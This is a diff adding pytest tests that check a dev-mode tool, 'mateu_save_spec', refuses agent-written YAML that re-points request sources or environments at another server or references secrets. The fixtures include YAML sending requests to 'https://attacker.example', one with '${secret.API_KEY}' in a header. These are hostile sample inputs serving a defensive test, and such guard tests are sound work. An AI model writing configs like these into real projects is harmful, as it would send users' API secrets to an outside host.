@@ -375,6 +375,43 @@ def test_save_spec_writes_nothing_when_the_definition_has_errors(dev):
     assert not (dev / "bad.yml").exists()
 
 
+# NM3: an agent saves what a screen is made of, never what decides a request — so in dev mode it
+# cannot re-point a proxied source at its own server and have Mateu send it the secret.
+AGENT_REFUSED = [
+    ("pay.yaml", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n"),
+    ("prod.yaml", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n"),
+    ("r.yaml", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n"),
+    ("p1.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n"
+     "    headers:\n      X-Api-Key: ${secret.API_KEY}\n"),
+    ("p2.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n"
+     "    proxy: true\n"),
+    ("p3.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n"
+     "    url: https://attacker.example\n"),
+]
+
+
+@pytest.mark.parametrize("path,text", AGENT_REFUSED)
+def test_save_spec_refuses_what_could_repoint_a_request_or_leak_a_secret(dev, path, text):
+    out = json.loads(text_of(call("mateu_save_spec", {"path": path, "yaml": text})))
+    assert out["saved"] is False
+    assert out["reason"].startswith(
+        ("Only a page, a partial or a business-component catalogue can be saved by an agent;",
+         "A definition saved by an agent may not reference a secret,")
+    )
+    assert not (dev / path).exists()
+
+
+@pytest.mark.parametrize("path", ["sources.yaml", "x/routes.yml", "environments/prod.yaml"])
+def test_save_spec_refuses_a_catalogue_file_whatever_it_holds(dev, path):
+    r = call("mateu_save_spec", {"path": path, "yaml": PAGE})
+    assert r["isError"] is True
+    assert text_of(r) == (
+        f'Error: Refused path "{path}": catalogue files (sources, routes, actions, types, project,'
+        " environments, translations) are written by hand."
+    )
+    assert not (dev / path).exists()
+
+
 def test_save_spec_without_a_specs_directory(monkeypatch, tmp_path):
     monkeypatch.setattr(dev_specs, "_forced", True)
     monkeypatch.setattr(dev_specs, "_dir", str(tmp_path / "missing"))
